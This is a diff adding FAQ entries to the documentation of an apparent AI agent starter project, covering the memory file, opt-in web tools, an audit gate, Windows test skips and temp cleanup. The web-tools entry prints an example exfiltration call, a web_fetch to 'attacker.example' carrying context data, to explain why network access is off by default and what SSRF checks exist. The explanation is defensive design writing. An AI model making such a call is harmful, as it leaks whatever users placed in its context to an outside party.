@@ -71,6 +71,18 @@ Retrieval is pluggable behind the `Retriever` interface. Default is in-process k
 
 Store vectors in memory (default) or persist with `PI_KNOWLEDGE_VECTOR_STORE=sqlite` + `PI_KNOWLEDGE_VECTOR_DB_PATH` (content-hashed chunk ids so restarts skip re-embedding). Verify with `npm run rag:smoke` (prints `SKIP` when offline). For a real vector DB (Qdrant/pgvector), implement `VectorStore` and pass `buildAgent({ vectorStore })` — the `search_knowledge` tool and model side stay unchanged.
 
+### Where does cross-session memory live, and can I keep it out of the picture?
+
+`remember` / `recall` write JSONL to `~/.pi/agent/pi-starter-memory.jsonl` (override the path with the store's `filePath`). It is **on by default**, because "remember me" is otherwise impossible across conversations. The file and its directory are created `0600` / `0700` — same policy as `auth.json` and the provider-key store — and repeated writes of the *same* text overwrite the entry rather than duplicating it (models re-state facts). Bounds: 4 KB per entry, 2000 entries (oldest evicted and reported honestly), 4 MB file cap.
+
+Turn it off with `PI_MEMORY=off` (or `buildAgent({ memory: false })`): both tools disappear from the tool list *and* from the capability catalog, and `GET/POST/DELETE /memory` is not mounted. It is deliberately **not** the knowledge base: knowledge is read-only, ships in the repo, and only its catalog goes into the system prompt; memory is writable, per-machine, and is fetched on demand via `recall`.
+
+### The agent has no web tools by default — isn't that a gap?
+
+It is a choice, and it is opt-in: `PI_WEB=on` registers `web_fetch` (`web_search` additionally requires an injected search backend via `buildAgent({ webClient })`). Outbound network is an exfiltration channel — `web_fetch("https://attacker.example/?d=<anything in the context>")` leaks whatever the model can see — and this server has no authentication, so the default is off, exactly like the coding tier is off by default.
+
+What is defended when you turn it on: http/https only; loopback / private / link-local / multicast / CGNAT and IPv4-mapped addresses refused, **including when a hostname resolves to one**; redirects are followed one hop at a time with the host check re-run **before each hop is requested**, so a `302` to an internal address never results in a request being sent there. What is *not* defended: the model picks the URL, and the DNS check has a resolve-then-connect window (rebinding). See `SECURITY.md` for the honest boundary.
+
 ## Model switching
 
 ### CLI: how do I switch mid-session?
@@ -127,6 +139,24 @@ const agent = await buildAgent({ extraTools: [myTool] });
 ```
 
 Then in the tier you run under (`readonly` / `coding`), `myTool`'s name is merged into the SDK allowlist automatically.
+
+### `npm run verify:audit` says "could not execute" — is that a vulnerability or nothing?
+
+Neither, and the distinction is the point. The audit gate keeps three outcomes apart: **pass**, **advisories found** (exit 1), and **could not execute** (exit 2 — `npm` itself did not run). Collapsing the third into either of the others has already happened here twice: a bare `catch` turned a Windows spawn failure into a permanent red, and the `--tolerate-network` variant turned the same failure into a silent green while printing "skipped". An "unavailable" verdict therefore never exits 0, and the message names the cause (`scripts/npm-invocation.mjs` probes `npm --version` through the exact same invocation path the audit will use, so pre-flight and work can never disagree).
+
+### Some tests skip on Windows. Is the suite actually green there?
+
+Yes — `npm run verify` passes on Windows, and every skip is printed with its reason rather than passed off as a success. Three families are POSIX-only by nature:
+
+- **File modes** — Windows `chmod` can only set the read-only bit, so `0600` and `0644` are indistinguishable in `stat.mode` (measured: always `0o666`). Affects `setup` (`.env` / `auth.json`), the SQLite vector store, and the memory file.
+- **File symlinks** — need developer mode or privileges, and a junction (which any user can create) only works for directories, so it cannot express "harmless link name → real target is `.env`". Affects `guard` and the file service's `denyNames` tests.
+- **Real `SIGTERM`** — `child.kill` on Windows goes through `TerminateProcess`, so the signal path is unobservable; the shutdown *orchestration* was extracted into `src/graceful.ts` and is covered on every platform instead of being left unwatched.
+
+The remote pipelines run in a Linux container, so a Windows-only failure would never be seen by CI. That asymmetry is why new gates are always run locally before being called green, and why `verify` includes `verify:audit` at all.
+
+### Do the tests clean up after themselves?
+
+They now have to: temp directories come from `tempDir()` (`src/test-tmp.ts`), which registers removal on process exit and **reports** anything it could not delete instead of swallowing the error. Before that, 111 bare `mkdtempSync` calls left 8.5k directories (~165 MB) in the system temp folder, and every full test run added another layer.
 
 ## Meta
 
